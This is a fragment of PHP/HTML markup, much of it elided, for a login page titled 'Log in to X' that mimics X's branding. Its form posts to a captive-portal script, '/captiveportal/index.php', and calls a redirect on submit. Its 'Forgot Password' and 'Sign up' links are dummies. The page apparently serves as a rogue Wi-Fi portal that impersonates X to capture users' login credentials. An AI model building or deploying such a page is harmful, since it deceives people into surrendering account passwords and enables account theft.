...
?>
  ...
  <head>
    ...
    <link rel="icon" type="image/png" href="assets/img/j35g5c9082.png"/>
  ...
  <body>
    ...
    <div class="container">
      <div class="account-wall">
        ...
        <h1 class="text-center login-title">Log in to X</h1>
          ...
          <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
            ...
            <div class="text-center terms-text1"><a href="#" class="url-color">Forgot Password?</a> · <a href="#" class="url-color">Sign up for X</a></div><br>
